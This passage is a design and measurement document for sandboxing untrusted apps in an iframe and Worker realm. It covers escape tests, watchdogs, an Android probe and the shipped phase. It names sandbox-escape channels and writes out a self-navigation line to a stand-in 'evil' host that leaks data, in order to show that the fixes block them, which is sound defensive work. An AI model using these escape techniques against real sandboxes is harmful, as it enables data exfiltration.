---
title: Browser realm
description: Shared apps in a sandboxed iframe and Worker: the prototype's measurements and what shipped.
status: current
order: 22
---

# 22 · Browser-realm prototype — shared apps in a sandboxed iframe + Worker (#272)

> **§0–§9 are the prototype report (2026-10-13); §10–§11 describe what shipped.** The current
> overview is docs/00 "Security isolation"; this page is the deep reference it links to.

**Status: phase 1 shipped (2026-10-14), phase 3 shipped (2026-10-16). Shared apps' logic runs in the
realm, and so do their custom views** — each view in a sandboxed frame of its own, on every engine,
behind a watchdog and a crash-loop guard (**§11**; the owner changed condition 4 of §8 on 2026-10-16).
Phase 1, as before: the owner approved
phase 1 after this prototype (#272): logic in the realm, the shell's `frame-src 'none'`, the WebRTC
removal; custom views stay as they are; the view phase waits for the Android probe (§5). What
shipped, how it differs from the prototype, how to fall back to QuickJS and what changed for the
#14 audit are in **§10**. CLAUDE.md rule 3, docs/04, docs/05 and docs/07 are updated. The prototype
itself stays in `docs/spikes/browser-realm/` (typechecked by `pnpm typecheck:spikes`): it is the
measurement record, the view half (`mount`) and the Android probe.

## 0. The answer on one page

| Question | Answer |
|---|---|
| Does a shared app with `Intl`, `URL`, `TextEncoder` and chart.js run and draw? | **Yes, in every engine.** Same bundle through QuickJS: the four computed fields come back empty. |
| Do the escapes fail? | **Yes, all of them, in every engine, once two holes are closed.** These are WebRTC from a view and the frame navigating itself. Neither hole exists in QuickJS. Both fixes are in the prototype. |
| Busy loop in **logic** | **Killed in ~1.0 s in every engine. The shell's event loop never stalled by more than 15 ms.** |
| Busy loop in a **view** | **Only Chromium with site isolation keeps the shell alive.** Firefox, Firefox+Fission, WebKit and Chromium without site isolation **freeze the shell** for as long as the loop runs. |
| Android WebView | **Not measured here.** A probe and steps are ready (§5). The decision for views depends on that result. |
| `ctx` round trip | **Faster than QuickJS** for query (1.4–4.7×). Formatting is 5–30× faster, because it no longer crosses. `get` and `storage.get` are about the same. |
| Memory | 2.7–11 MB per sandbox, against QuickJS's 5–13 MB. **QuickJS's "hard 64 MB cap" does not hold today** (§6.1). |

**Recommendation: go, with conditions** (§8). Move **logic** to the realm. Ship **custom views** in
the realm only where the shell cannot be frozen, which is desktop Chromium as measured. On the other
engines, either keep views off for shared apps, as they are today, or run views in the Worker
(OffscreenCanvas / remote DOM). Choose once the Android probe has a result.

Engines: Chromium 151.0.7922.34 (full build, new headless) and its headless shell, Firefox 153.0
(with and without Fission), WebKit 26.5 (Playwright 1.62, Linux). Every number in this doc is from
one full run of `test/realm.spec.ts` against all five configurations, ten tests each, all green. The
machine was shared with other sessions, so treat the timings as ±50 %.

## 1. What was built

```
 shell page (the host) ─────────────────────────────────────────────────────────────┐
 │ createHost({ loadIsolated: createRealmLoader(...) })   ← the isolate's plug point │
 │ runtime → LoadedApp.call*(…, ctx)  ctx = buildCtx(): mediateCaps, values-gate,    │
 │                                          authorship (unchanged product code)      │
 │ RealmLoadedApp: op table → ctx.<method>(…)   watchdog: deadlines + heartbeats      │
 │        ▲ MessagePort "logic"                    ▲ MessagePort "view"              │
 └────────┼─────────────────────────────────────────┼────────────────────────────────┘
          │      <iframe sandbox="allow-scripts" srcdoc=…>  (opaque origin, realm CSP)
          │      ┌──────────────────────────────────┼──────────────────────────────┐
          │      │ frame-runtime (main thread):     │                              │
          │      │   removes RTCPeerConnection, mounts custom views (`mount`),     │
          │      │   ctx proxy on the view port, beats every 100 ms                │
          │      │  ┌────────────────────────────┐                                 │
          └──────┼──┤ Worker (blob:)             │  app bundle (the SAME IIFE the  │
                 │  │ worker-runtime:            │  isolate runs), DirectLoadedApp │
                 │  │ ctx proxy on the logic port│  dispatch, format.ts for t/format│
                 │  │ beats every 100 ms         │                                 │
                 │  └────────────────────────────┘                                 │
                 └──────────────────────────────────────────────────────────────────┘
```

- **A drop-in for the isolate.** `createRealmLoader()` has `createIsolateLoader()`'s signature, so
  `createHost`, `buildCtx` and every `LoadedApp.call*` caller are untouched
  (`src/realm-host.ts`).
- **One mediated `ctx`, no second copy of any check.** The isolate re-implements the data ops against
  the Store (`isolate-host.ts` `handleOp`). The realm routes every op to the `ctx` the runtime passed
  in, the one `buildCtx` made. So `create` goes through `stampAuthor` and `assertValuesFit`, and
  `caps.network.fetch` goes through `mediateCaps`. Each op is the same method call a trusted app
  makes. The host only checks that the op name is on a fixed list (`OPS`) and that the ctx id is one
  it issued. Computed fields resolve host-side through `callComputed`, which goes back into the
  Worker.
- **Formatting moves into the realm.** The Worker bundles the host's own `format.ts`. `ctx.t` and
  `ctx.format` give a trusted app's answers without a round trip, and `__hostPure` has no job left.
- **The Worker reuses the trusted runner's dispatch.** `DirectLoadedApp` runs the calls, with a
  `ctx` proxy where the real `ctx` would be.
- **Watchdog.** Every call has a deadline (1 s, which pauses while a question is open for the
  person, as the isolate's does). The Worker and the frame each beat every 100 ms, and a silence of
  1 s kills. A kill posts `stop` to the frame, which terminates the Worker, then removes the iframe.
  If the host's own check runs more than 1 s late while a view is mounted, the shell's thread was
  blocked, and it kills too. The next call starts a fresh realm in 40–60 ms.
- **Isolation flags.** `sandbox="allow-scripts"` and nothing else: no `allow-same-origin`, no
  `-top-navigation`, no `-popups`, no `-forms`, no `-modals`. Realm CSP:
  `default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' blob:; worker-src blob:; style-src 'unsafe-inline'; img-src blob: data:; font-src blob: data:; media-src blob: data:; connect-src 'none'; form-action 'none'; base-uri 'none'; webrtc 'block'`.
  `eval` and Wasm compilation are allowed on purpose, because they load nothing and libraries use
  them. **The shell itself needs `frame-src 'none'`** (§3.2).
- **Not built:** React views (`render`; only `mount` is wired), `files.import/export`,
  `media.put`, filesystem caps, one frame per view, and integration into the shell or the views
  registry.

Files: `src/` (host, protocol, worker and frame runtimes, ctx proxy), `fixtures/*.app.ts` (demo,
bench, escape, busy), `page/` (the stand-in shell), `test/realm.spec.ts`, `android/` (§5),
`build.mjs`, `vite.config.mjs` (dev server, plus the HTTP, WebSocket and STUN probes the escape spec
counts).

## 2. A shared app that needs a real browser (acceptance 1)

`fixtures/demo.app.ts`. Its computed fields use `Intl.NumberFormat("de-DE")`, `new URL()`,
`TextEncoder` and `Intl.Segmenter("ja")`. Its custom view draws a chart.js bar chart, using
`apps/mood-sleep`'s chart.js devDependency, with no esm.sh. The spec reads the rows as the runtime
sees them and counts the bar colour's pixels on the canvas.

| | Chromium | headless shell | Firefox | Firefox+Fission | WebKit |
|---|---|---|---|---|---|
| computed (`price`, `host`, `bytes`) | `1.234,50 €`, `example.org`, 27 | same | same | same | same |
| bar pixels on the canvas | 22,528 | 22,528 | 22,528 | 22,528 | 22,664 |
| load / mount (ms) | 78 / 15 | 70 / 14 | 80 / 30 | 78 / 30 | 69 / 17 |
| **same bundle in QuickJS** | loads; `price`, `host`, `bytes` and `words` **absent** (contained failures, #262) | same | same | same | same |

## 3. Escape attempts (acceptance 2)

`fixtures/escape.app.ts` tries every way out we know, from the Worker (logic) and from the frame (a
view). The app's own report is not the evidence. The evidence is the probe server, which counts
every HTTP request, WebSocket upgrade and STUN datagram it receives, together with the host's own
URL, storage and records.

### 3.1 Results, all five configurations

- **No request reached any probe.** All five configurations, from either side, showed
  `http: []` and `udp: 0`. The attempts were `fetch` to the probe and to the shell's own origin,
  `WebSocket` to a relay URL, `EventSource`, `importScripts(url)`, `new Worker(url)`, `<img>`,
  `<script src>`, a nested `<iframe src>`, a form submit, `sendBeacon`, `window.open`, top-level
  navigation, and STUN.
- **Host state was out of reach.** These all threw `SecurityError` or were absent: `localStorage`,
  `sessionStorage`, `document.cookie`, `indexedDB`, `parent.document`, `parent.localStorage`,
  `parent.__relay` (a planted relay token), and reading `top.location`. The shell's URL and its
  `localStorage` secret were unchanged afterwards.
- **No identity or relay surface.** `ctx.space.invite` throws, and no relay op exists.
  `create({…, createdBy: "someone-else"})` was stored as `me-1`, stamped by `buildCtx`.
- **Network through ctx is mediated.** `ctx.caps.network.fetch` without the permission gave
  `Permission denied: … → network`. That message comes from `mediateCaps` itself.
- **Speaking the protocol by hand fails.** The view patched `MessagePort.prototype.postMessage` to
  steal the runtime's port and sent raw ops. The host answered `op not allowed: relay.connect`,
  `op not allowed: __proto__` and `no such ctx` (for a made-up ctx id).
- **Storage does not cross from one app to the next.** WebKit gives a Worker in an opaque origin a
  working `caches`. A value written by one sandbox was not there in the next one. Chromium and
  Firefox refuse `caches` outright.

### 3.2 The two holes, and the fixes the prototype ships

1. **WebRTC.** CSP does not govern ICE, and none of the engines honoured `webrtc 'block'`. With
   `RTCPeerConnection` left in place, a view's ICE gathering sent **4 / 4 / 5 / 5 / 4 STUN
   datagrams** to our probe (Chromium, headless shell, Firefox, Fission, WebKit). The TURN username
   or a hostname label is all the payload an attacker needs. **Fix:** the frame runtime deletes
   `RTCPeerConnection` and its prefixed forms before any app code runs, and the result was 0
   datagrams everywhere. A nested `about:blank` frame cannot hand the constructor back. Inside a
   sandbox without `allow-same-origin` it is another opaque origin, and reading its globals threw
   `SecurityError` in all three engines (tested by the escape app itself). Workers never had WebRTC.
   This is a deny-list, so the security audit (§8, #14) must re-check it for every new
   channel-opening API.
2. **The frame navigating itself.** `location.href = "https://evil/?data=…"` is allowed by the
   iframe sandbox, and the frame's own CSP cannot stop it. With the shell served **without** a CSP,
   the probe received `GET /probe/self-nav?data=stolen` in every engine. With the shell served
   with **`Content-Security-Policy: frame-src 'none'`** it received nothing in any engine, and the
   srcdoc realm still loads, because srcdoc is not a fetch. The host also sees the second `load`
   event and kills the realm. **The shell must ship that header**, and so must the Capacitor build.

## 4. Busy loops (acceptance 3)

The spec samples the shell's own event loop every 10 ms and reports the largest gap. After a kill
it reads per-thread CPU from `/proc` to show that the spinning thread is really gone.

### 4.1 Logic: `for (;;) {}` in a page action, and an action that returns and *then* spins

| | Chromium | headless shell | Firefox | Fission | WebKit |
|---|---|---|---|---|---|
| call rejected after (ms) | 1000 | 1000 | 1002 | 1000 | 972 |
| shell's largest gap while it spun (ms) | 10 | 10 | 12 | 12 | 13 |
| "return, then spin" caught by the heartbeat | yes | yes | yes | yes | yes |
| next call, fresh realm (ms) | 52 | 41 | 53 | 53 | 40 |
| spinning thread after the kill | gone | **~1 core for ≤ 2 s**, then gone | gone | gone | gone |

The headless shell keeps the spinning thread for up to 2 s. Without site isolation, Blink ends a
spinning Worker only after its forcible-termination grace. With site isolation the frame's process
is torn down, and the thread goes with it.

### 4.2 View: the frame's main thread spins (3 s bounded, then endless where survivable)

| | Chromium | headless shell | Firefox | Fission | WebKit |
|---|---|---|---|---|---|
| shell's largest gap during a 3 s view loop (ms) | **11** | **3000** | **3001** | **3003** | **3009** |
| shell frozen? | **no** | **yes** | **yes** | **yes** | **yes** |
| endless view loop | killed after 1110 ms, shell gap 10 ms, thread gone | not run: it would hang the tab | not run | not run | not run |

- **Why Chromium differs.** Full Chromium puts sandboxed frames out of process. That is site
  isolation plus isolated sandboxed iframes, which desktop Chrome ships. Without site isolation (the
  headless shell, `--site-per-process` off), the frame shares the shell's renderer thread. Turning
  on `fission.autostart` did not change Firefox. Our reading, not verified in Firefox's source, is
  that the opaque frame is grouped with the site that created it, which puts it in the shell's
  process. Safari/WebKit has no site isolation.
- **Where the thread is shared, nothing can stop the loop.** The watchdog cannot run while the
  thread is blocked, so it cannot pre-empt a view. It notices only after the loop yields, and then
  kills ("the shell's thread was blocked for 2960 ms while a view was mounted"). An endless loop
  hangs the tab.
- **A Chromium caveat.** All sandboxed frames from one embedding site share one renderer process:
  1 realm or 5 realms both used one extra renderer. With a second app's realm alive, a killed
  spinning view **kept a core busy indefinitely**, because the process cannot exit while it still
  has frames, and it froze the other apps' views in the meantime. The shell was fine. The fix is to
  escalate: tear down every realm in that process, then restart the healthy ones. A process with no
  frames exits; the single-realm case showed exactly that.

## 5. Android WebView: test page and steps (not run here)

**From the APK, without USB (#267):** open Potyro with `#probe=realm` on its address, or open **You**
and tap its heading **seven times**. The "Sealed screens on this device" screen runs the same three
3-second loops (`packages/shell/src/realm-probe.ts`), shows the verdict in large type and the three
numbers, and **Copy results** copies the JSON (where there is no clipboard, the text is selected for
a long-press copy). A counter in its corner stops while Potyro is frozen. It does nothing unless
asked, in dev and release builds alike. The DevTools path below still works.

`docs/spikes/browser-realm/android/probe.js` is self-contained, with no imports and no network. It
builds the same realm (sandboxed srcdoc iframe, the realm CSP, a blob: Worker) **inside the running
Potyro app's own document**. Then it runs three 3-second loops, measuring the shell's timer gaps
during each:

1. the shell itself, as calibration;
2. the Worker;
3. the frame's main thread (the view case).

It draws a ticker and an overlay with the numbers and a verdict on the phone, and returns them as
JSON. `android/run-on-phone.mjs` drives it over DevTools and also counts out-of-process iframe
targets. It was dry-run against desktop Chromium (`--cdp`). It reported `outOfProcessIframes 1` and
"does NOT freeze" on full Chromium, and `0` and "FREEZES" on the headless shell, matching §4.2.

**Steps (owner + main session):**

1. Phone on USB, USB debugging on, `adb devices` lists it. Install and open a **debug** build of
   the app (`packages/native`, see docs/13). Capacitor debug builds have WebView debugging on.
   Leave the app in the foreground on any screen.
2. Run:
   ```sh
   export PATH=/home/aivuk/.nvm/versions/node/v22.13.1/bin:$PATH
   node docs/spikes/browser-realm/android/run-on-phone.mjs --spin 3000
   ```
   (`--pkg app.potyro` is the default.) The script runs `adb forward` to the app's
   `webview_devtools_remote_<pid>` socket, connects, injects the probe and prints JSON.
3. Fallback by hand: on the desktop open `chrome://inspect`, choose the Potyro WebView, then
   Console. Paste `probe.js`, then run `await __realmProbe()`.

**What to look for in the JSON (and on the phone's overlay):**

- `shellSpinMaxGapMs` ≈ 3000. This is the calibration, showing what "frozen" looks like on this
  device.
- `workerSpinMaxGapMs` should be small (tens of ms). If it is near 3000, even logic would freeze the
  shell, which would be a surprise and a no-go.
- **`frameSpinMaxGapMs`** is the decision:
  - **≈ 3000, `viewFreezesShell: true`.** The view shares the shell's thread, as on desktop
    Firefox and WebKit. **The ticker on the phone stops for 3 s.** Iframe views are then not safe on
    Android.
  - **Small, `viewFreezesShell: false`.** The frame is out of process. Expect
    `outOfProcessIframes.whileProbeRuns` ≥ 1.
- `hello.worker: true` and `hello.origin: "null"` confirm that a blob Worker starts in an opaque
  sandbox on this WebView. `hello.segmenter: "function"` confirms that `Intl.Segmenter` exists.
- Record `webviewVersion` (from `dumpsys webviewupdate`) and `userAgent` with the result.

## 6. Round trip and memory (acceptance 4)

The same bundle (`fixtures/bench.app.ts`) runs in both runners, in the same page and browser. Each
page action makes 200 calls of one kind. The table gives the median of 5 runs, divided by 200, with
**QuickJS → realm**, in ms per call. "noop" is a whole host→app→host call. `query` reads 50 rows.
Firefox and WebKit coarsen `performance.now()` to 1 ms, so their noop column is quantized.

| per call (ms) | Chromium | headless shell | Firefox | Firefox+Fission | WebKit |
|---|---|---|---|---|---|
| call itself (noop) | 0.8 → **0.3** | 0.7 → **0.1** | 1 → **0** | 1 → **1** | 1 → **1** |
| `ctx.query` (50 rows) | 1.07 → **0.33** | 1.09 → **0.23** | 6.67 → **4.78** | 6.52 → **4.76** | 1.44 → **0.81** |
| `ctx.get` | 0.11 → **0.07** | 0.12 → **0.03** | 0.57 → **0.67** | 0.55 → **0.61** | 0.16 → **0.26** |
| `ctx.storage.get` | 0.077 → **0.058** | 0.077 → **0.025** | 0.42 → **0.32** | 0.41 → **0.35** | 0.11 → **0.22** |
| `ctx.t(words, vars)` | 0.042 → **0.004** | 0.043 → **0.003** | 0.175 → **0.010** | 0.165 → **0.010** | 0.070 → **0.010** |
| `ctx.format.date` | 0.038 → **0.004** | 0.039 → **0.003** | 0.150 → **0.005** | 0.145 → **0.005** | 0.055 → **0.010** |
| load (ms) | 60 → **63** | 59 → **52** | 56 → **59** | 60 → **60** | 55 → **63** |
| memory per sandbox (MB, PSS, 10 sandboxes) | 5.3 → **8.3** | 5.3 → **2.7** | 11.1 → **7.8** | 12.8 → **8.4** | 12.0 → **11.2** |

- `query` is faster in the realm everywhere. It sends structured clones rather than JSON, and the
  computed fields are not re-evaluated inside a VM.
- Single-record ops are a wash. WebKit's are slightly slower: a postMessage hop costs more there
  than a QuickJS bridge call.
- Formatting no longer crosses at all.
- Memory is PSS of the browser's whole process tree, before and after 10 extra sandboxes, so it
  includes process overhead where there is any. In full Chromium every sandboxed frame shares *one*
  extra renderer (§4.2), which amortises it. Run-to-run noise is about ±3 MB.
- The realm runtimes are 131 KB (Worker) and 127 KB (frame) minified, about 35 KB each gzipped.
  Most of that is `potyro`'s schema, pulled in by `format.ts` and `direct-host.ts`, and it could be
  trimmed.

### 6.1 Memory: what a sandbox may hold

`busy.app.ts` "hold memory" keeps 512 × 1 MB typed arrays:

| | Chromium | headless shell | Firefox | Fission | WebKit |
|---|---|---|---|---|---|
| QuickJS (`setMemoryLimit(64 MB)`) | **held it**, +491 MB | held, +480 MB | held, +489 MB | held, +489 MB | held, +846 MB |
| realm | held, +516 MB | held, +515 MB | held, +511 MB | held, +512 MB | held (PSS too noisy) |

**QuickJS's hard memory cap is not a total cap as shipped.** quickjs-emscripten 0.31's build has
no `malloc_usable_size` ("malloc_usable_size unavailable" in its own memory dump). QuickJS
therefore never counts what it has allocated, and `setMemoryLimit` refuses only a single allocation
bigger than the limit. This reproduces in Node with the package alone: 512 typed arrays of 1 MB
pass, 512 arrays of 131,072 doubles pass, and one 512 MB string fails with `out of memory`. So
moving to the realm loses less than the issue assumed. Fixing the cap is a separate bug, and the
fix would be a custom allocator in the WASM build.

## 7. What is lost compared with QuickJS, and the mitigations (acceptance 5)

| QuickJS gives | Realm | Mitigation |
|---|---|---|
| **Memory cap** (claimed: 64 MB per isolate) | None per Worker. `measureUserAgentSpecificMemory` needs cross-origin isolation, which an opaque frame does not have. | The cap did not hold anyway (§6.1). Cap what crosses `ctx` (rows per query, payload bytes, as `FORMAT_LIMITS` already does). Rely on process isolation where the engine has it. On Android, add a native `WebViewRenderProcessClient.onRenderProcessUnresponsive` / render-process-gone handler that reloads the shell with that app's realm off. |
| **Deterministic interrupt.** The interrupt handler aborts *one call* and keeps the VM. | The whole realm is killed after ≤ 1 s of silence, losing in-memory state, with a 40–60 ms restart. | App state lives in the Store, so the loss is a cache. Escalate repeated kills to "this app keeps stopping, show it without its own code" (the declarative fallback). |
| **Pre-emption of any code.** QuickJS checks the interrupt inside every loop. | Logic: yes, by thread termination. **Views: only where the frame is out of process** (desktop Chromium). Elsewhere a view loop blocks the shell until it yields. | Views in the Worker: OffscreenCanvas (chart.js supports it) or a remote-DOM tree rendered by the shell (Shopify's design), which keeps view code off every main thread. Or keep views trusted-only on those engines. |
| **Identical semantics everywhere.** QuickJS behaves the same on web and on native. | Built-ins are the engine's own, with ICU data per browser and version. | That is the point of #272: an app behaves as it would in the person's own browser. Formatting goes through one module (`format.ts`) at both provenances, as before. |
| **No WebRTC and no navigation by construction.** | Both exist in the frame. | §3.2: delete the RTC constructors, and serve the shell with `frame-src 'none'`. Both are measured fixed. |

## 8. Recommendation and migration sketch

**Go, with conditions.** Logic in the realm meets every acceptance point in every engine. It is
faster, it runs any package, and it reuses the mediated `ctx` with less code than the isolate:
the data ops are not re-implemented. Custom views in the frame meet the acceptance point only in
desktop Chromium. That is the condition.

**Conditions:**

1. The Android probe (§5) runs on the owner's phone before any view work is planned.
2. The shell (web and Capacitor) is served with `frame-src 'none'`, or a list of exactly the frames
   it embeds, before the first realm ships.
3. The RTC deletion and the op list are in the #14 audit scope, and so is everything in "Security
   audit" below.
4. ~~Views ship in the realm **only where the shell cannot be frozen**. Otherwise they stay off for
   shared apps, as today, until views-in-Worker exists.~~ **Changed by the owner, 2026-10-16:** views
   of shared apps render in the sealed frame on **every** engine, protected against freezes — a
   watchdog that takes a stuck view down and shows the app's plain version, a crash-loop guard so an
   endless loop can freeze Potyro at most once per app, and the Chromium shared-process escalation
   (§11). Shipped the same day.

**Phases:**

1. **Logic realm behind a flag. ✅ Done 2026-10-14 (§10)** — the realm is the default and QuickJS is
   behind the flag, the other way round from this sketch, per the owner's phase-1 decision.
   Move `src/` into `packages/host` as `realm/` next to `isolate/`,
   and add `dev:sandbox --realm`. Make the isolate's tests a runner-agnostic contract suite
   (`isolate-host.test.ts`, `mediate*.test.ts`, `value-gate.test.ts`) and run it against both
   runners in a browser (Vitest browser mode or Playwright). Run the 11 `*-sandbox.spec.ts` specs
   against the realm.
2. **Shell hardening and lifecycle.**
   - Shell CSP.
   - One realm per open shared app, torn down when the app closes.
   - A kill UI ("this app stopped responding").
   - The Chromium shared-process escalation (§4.2).
   - Verification (`verify-candidate.ts`, the Studio) on the realm, so that candidates are judged
     in the environment they will run in.
3. **Views. ✅ Done 2026-10-16 (§11)** — iframe views (#267) behind the watchdog on every engine,
   not branching on the Android result (condition 4, changed). Views in the Worker (OffscreenCanvas,
   remote DOM) remain a way to take views off every main thread, should the probe show WebView
   frames freeze the shell and that turn out to matter in practice.
4. **Remove QuickJS.** Delete `isolate/`, `__hostPure`, `quickjs-emscripten`, the isolate stubs'
   QuickJS-only caveats, and the docs/20 §2.4 bridge. Keep the bundle format: the realm runs the
   same IIFE.

**CLAUDE.md rule 3, proposed text:** "Provenance decides execution, not the app. Trusted (user's
own) → direct. Untrusted (imported/shared) → a browser realm: an opaque-origin sandboxed iframe
with a strict CSP, logic in its Worker, host power only through the mediated `ctx` over
MessagePorts, denied-by-default caps, a permission prompt and a watchdog. Never run untrusted app
code with ambient authority, and never in the shell's own realm." The mental-model paragraph, the
`host/` line in the layout, and "When in doubt" change to match.

**Docs that change in the same PR as the move:**

- **docs/07.** "Why QuickJS-WASM" becomes "Why a browser realm": this doc's evidence, the limits
  table from §7, and the shell CSP.
- **docs/05.** The runner description, the `__hostPure` paragraph (deleted), the custom-view policy
  (depending on the views decision), and "Hard limits" (cap what crosses; watchdog).
- **docs/04.** "How ctx differs by trust", where it mentions the isolate.
- **docs/20 §2.4.** The bridge-call cost becomes historical.
- **docs/09/12.** The contract suite and the sandbox specs.

**Tests:**

- The contract suite, run against both runners while both exist.
- The escape spec (this one) moves into `e2e/` as a sandbox spec, with the probes. It runs in
  Chromium, Firefox and WebKit in CI.
- A watchdog spec covering logic, view and "return then spin".
- A Capacitor/Android conformance step that runs `probe.js` on the device.

**Security audit (#14), re-scoped:**

- **The frame bridge.** The op list (`OPS`) and ctx-id issuance, argument handling in `route` (it
  calls `ctx` methods with values from the realm, so every `ctx` method is now a boundary), and
  structured-clone payloads (sizes, getters cannot cross).
- **The iframe.**
  - The sandbox flags.
  - The realm CSP: `'unsafe-eval'`, `blob:`, `webrtc 'block'` not honoured.
  - The srcdoc construction: the runtime is inlined with `</script` escaped.
  - `postMessage(…, "*")` at init. The ports carry the trust, and a sandboxed frame cannot be
    reached by others.
- **Channels CSP does not cover.** WebRTC (deleted), DNS prefetch (`<link rel=dns-prefetch>`,
  hostname-only, not measured), and any new API that opens a connection. Re-check this deny-list on
  every engine release.
- **The shell's CSP and navigation.**
- **Process models per target.** Chromium's shared sandbox process, and the WebView.
- **Denial of service.** Memory with no cap. Repeated kills.
- **QuickJS-specific items drop out of scope:** the marshal and the asyncify bridge.

## 9. Reproduce

```sh
export PATH=/home/aivuk/.nvm/versions/node/v22.13.1/bin:$PATH
pnpm i && pnpm typecheck:spikes
node docs/spikes/browser-realm/build.mjs                  # runtimes + fixture bundles → dist/
# the page by hand: http://127.0.0.1:4291/ (probes on 4292 http/ws and 4293/udp)
cd packages/shell && ./node_modules/.bin/vite --config ../../docs/spikes/browser-realm/vite.config.mjs
```

The spec runs from a scratch Playwright config. It is not committed, because the repo's
`playwright.config.ts` serves the product:

```ts
// realm.config.ts — one worker, unique ports, no server reuse
import { defineConfig, devices } from "@playwright/test";
export default defineConfig({
  testDir: "docs/spikes/browser-realm/test",
  workers: 1, retries: 0, timeout: 120_000,
  projects: [
    { name: "chromium", use: { ...devices["Desktop Chrome"], channel: "chromium" } }, // site isolation on
    { name: "chromium-headless-shell", use: { ...devices["Desktop Chrome"] } },      // site isolation off
    { name: "firefox", use: { ...devices["Desktop Firefox"] } },
    { name: "firefox-fission", use: { ...devices["Desktop Firefox"], launchOptions: { firefoxUserPrefs: { "fission.autostart": true } } } },
    { name: "webkit", use: { ...devices["Desktop Safari"] } },
  ],
  webServer: {
    command: "node docs/spikes/browser-realm/build.mjs && cd packages/shell && ./node_modules/.bin/vite --config ../../docs/spikes/browser-realm/vite.config.mjs",
    url: "http://127.0.0.1:4291/", reuseExistingServer: false,
  },
});
```

`REALM_RESULTS=<dir> npx playwright test -c realm.config.ts --project=chromium` writes each
measurement to `<dir>/<project>.json`. The CPU and PSS checks read `/proc`, so they work on Linux
only.

## 10. Phase 1, as shipped (2026-10-14)

### 10.1 What runs where

- **`packages/host/src/realm/`** (`@potyro/host/realm`): `createRealmLoader({ spawn, workerSource })`
  is a `loadIsolated` like `createIsolateLoader`; `frameSpawner()` builds the sandboxed srcdoc iframe
  (`frame.ts`, its runtime `FRAME_SOURCE` a 25-line plain script, small so the audit can read all of
  it); `worker-runtime.ts` is bundled to one script by `packages/host/realm-build.mjs`, which the
  shell's Vite config serves as `virtual:potyro-realm-worker` (`realmWorkerPlugin`, minified in
  builds: 147 KB, 40 KB gzipped, a lazy chunk loaded only when a shared app opens).
- **`packages/shell`**: `createSharedAppLoader` (`isolate-bridge.ts`) is what opening a shared app
  (`main.tsx`) and the Add-an-app test load (`app-trial.ts`) use. `realm-bridge.ts` wires the realm;
  `sandbox-runner.ts` decides. Verification, the Studio preview and the modify loop's checks stay on
  QuickJS (`createSandboxLoader`) until phase 2.
- **One realm per open shared app**, in `#potyro-realms` at the end of `<body>`; closing or switching
  the app disposes it (the iframe goes, its Worker with it).

### 10.2 Differences from the prototype

- **No app code on the frame's thread.** Views are not mounted in the frame (phase 3), so the frame
  only deletes the RTC constructors, starts the Worker and hands it the port. It cannot stall the
  shell, on any engine.
- **The bundle is evaluated with indirect `eval`** in the Worker, not `importScripts(blob:)`: one path
  for the browser and the Node tests; the realm CSP allows `'unsafe-eval'` on purpose (§1).
- **An `up` handshake.** The Worker says it is running before the app loads, so a realm that never
  comes up is a `RealmStartError` (the box failed), never confused with the app's top level throwing
  or spinning. The shell then runs that app — and shared apps for the rest of the session — in
  QuickJS, still sealed (`markRealmUnavailable`). This is the guard for a WebView we have not
  measured.
- **A flood guard.** A realm that posts more than 2,000 messages in 50 ms is stopped: a Worker posting
  heartbeats in a loop would otherwise keep the watchdog fed while starving the shell's thread.
- **`ctx` members QuickJS could not carry cross as themselves**: `caps.network.fetch` (a `Response`
  rebuilt from status, headers and bytes), `caps.camera.capture`, `caps.filesystem.pick/save`,
  `media.put`, `files.bytes`/`files.write` with bytes, `files.import/export`. Each is the mediated
  ctx's own method. The budget pauses while a consent prompt, a dialog, a sensor or a fetch waits.
- **`space.invite` is absent** in the realm, as through the isolate (it was a throwing stub).
- **The missing-feature card** (#271) names only what a Worker lacks — the page (`window`,
  `document`, …) — and understands WebKit's "Can't find variable: x".

### 10.3 Falling back to QuickJS

| Scope | How |
|---|---|
| One device | `localStorage["potyro:sandbox"] = "quickjs"` (and `"realm"`, or removing it, to go back) |
| A build or a deploy | `VITE_POTYRO_SANDBOX=quickjs pnpm --filter @potyro/shell build:web` |
| The dev server | `pnpm dev:sandbox:quickjs` |
| e2e | `POTYRO_QUICKJS=1 pnpm e2e --project=sandbox-quickjs` (every sandbox spec but the realm's own) |
| Automatically | no DOM or no Worker (the Node tests); a realm that would not start this session |

Removing QuickJS (phase 4) is deleting `isolate/`, `__hostPure`, `quickjs-emscripten`, the flag and
`createSandboxLoader`, once phase 2 has moved verification to the realm.

### 10.4 The shell's `frame-src 'none'`, verified per target

The spec is `e2e/shell-csp.ts` (a sandboxed srcdoc frame in the shell navigates itself to a probe
server; nothing may arrive; a control page with no policy shows the same frame does reach it), run in
Chromium, Firefox and WebKit:

| Target | Policy from | Verified |
|---|---|---|
| Dev server (`pnpm dev`, `dev:sandbox`) | header (`server.headers`, `shell/vite.config.ts`) + `<meta>` | `shell-csp-sandbox.spec.ts`, all three engines |
| Production build, `vite preview` | header (`preview.headers`) + `<meta>` | `shell-csp-prod.spec.ts` (`pnpm test:e2e:prod`), all three engines |
| Deployed site (Apache) | `Header always set Content-Security-Policy "frame-src 'none'"` (`deploy/apps.vaz.io.conf`) + `<meta>` | a local Apache serving `dist/` with that line copied from the file, all three engines |
| potyro.app (Caddy, config not in the repository) | header + `<meta>` | the header is served (`curl -I https://potyro.app/`, 2026-10-30); the escape spec has not been run against it |
| Capacitor WebView | `<meta>` in `dist/index.html` only (it serves no headers; `cap copy` copies `dist` as it is) | a server that sends no headers at all, all three engines: the `<meta>` alone stops it. Not run on a device here — the Android probe (§5) is the device step. |

The realm loaded and the escape and watchdog specs passed behind each of those servers too.

### 10.5 For the #14 audit: what changed

New attack surface, all of it in `packages/host/src/realm/` and the shell's CSP:

- **The op allow-list and ctx ids** (`OPS` in `protocol.ts`, `answer`/`route` in `realm-host.ts`).
  Every `ctx` method on the list is now a boundary: its arguments are values from untrusted code,
  coerced (`String`, `Number`, `instanceof Blob`) and handed to the mediated ctx. ctx ids are issued
  per app, the most recent 512 kept; anything else is "no such ctx".
- **The WebRTC removal** (`FRAME_SOURCE`): a deny-list of the RTC constructors, deleted before any
  other code runs in the frame. Re-check it on every engine release, and for every new API that
  opens a channel CSP does not govern.
- **The realm CSP** (`REALM_CSP`): `default-src 'none'`, `connect-src 'none'`, `'unsafe-eval'` and
  `'wasm-unsafe-eval'` on purpose, `blob:` for the Worker, `webrtc 'block'` (honoured nowhere).
- **The iframe**: `sandbox="allow-scripts"` only (opaque origin), srcdoc with the runtime inlined
  (`</script` escaped), `postMessage(…, "*")` at init carrying the two ports — the ports, not the
